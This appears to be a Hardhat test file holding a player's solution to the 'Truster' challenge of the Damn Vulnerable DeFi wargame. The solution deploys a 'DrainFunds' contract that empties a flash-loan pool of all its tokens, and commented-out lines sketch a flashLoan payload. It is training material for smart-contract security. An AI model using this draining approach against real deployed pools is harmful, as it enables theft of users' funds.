const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, player;
    let token, pool;

    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
        expect(await pool.token()).to.eq(token.address);

        await token.transfer(pool.address, TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

        expect(await token.balanceOf(player.address)).to.equal(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
      //bytes memory payload = abi.encodeWithSignature("flashLoan(uint256, address, address, bytes)", TOKENS_IN_POOL, player.address, pool.address);
      const DrainFundsFactory = await ethers.getContractFactory('DrainFunds', player);
      let drainFunds = await DrainFundsFactory.deploy(pool.address, token.address);
      await drainFunds.drain();
      //const payload = abi.encodeWithSignature("flashLoan(uint256,address,address,bytes)", 0, player.address, pool.address, "0x");
      //await pool.connect(player).flashLoan(0, player.address, drainFunds.address, "0x");
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await token.balanceOf(pool.address)
        ).to.equal(0);
    });
});

